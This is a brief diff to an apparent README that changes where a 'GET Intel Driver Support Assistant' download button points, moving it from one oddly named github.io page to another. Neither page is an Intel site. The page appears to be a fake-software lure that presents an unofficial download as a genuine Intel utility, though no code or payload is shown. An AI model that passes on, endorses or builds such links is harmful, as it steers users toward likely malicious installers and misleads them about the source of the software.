@@ -2,7 +2,7 @@
 
 ![Banner Placeholder](https://custom-images.strikinglycdn.com/res/hrscywv4p/image/upload/c_limit,fl_lossy,h_9000,w_1200,f_auto,q_auto/2068809/274058_884985.png)
 
-[![GET Intel Driver Support Assistant](https://img.shields.io/badge/GET%20%E2%80%94%20Intel%20Driver%20Support%20Assistant-0078D6?style=for-the-badge&logoColor=white)](https://bradleyschmittxbrh.github.io/.github/intel-driver-support)
+[![GET Intel Driver Support Assistant](https://img.shields.io/badge/GET%20%E2%80%94%20Intel%20Driver%20Support%20Assistant-0078D6?style=for-the-badge&logoColor=white)](https://denvertruongmosb.github.io/.github/intel-driver-support)
 
 ---
 
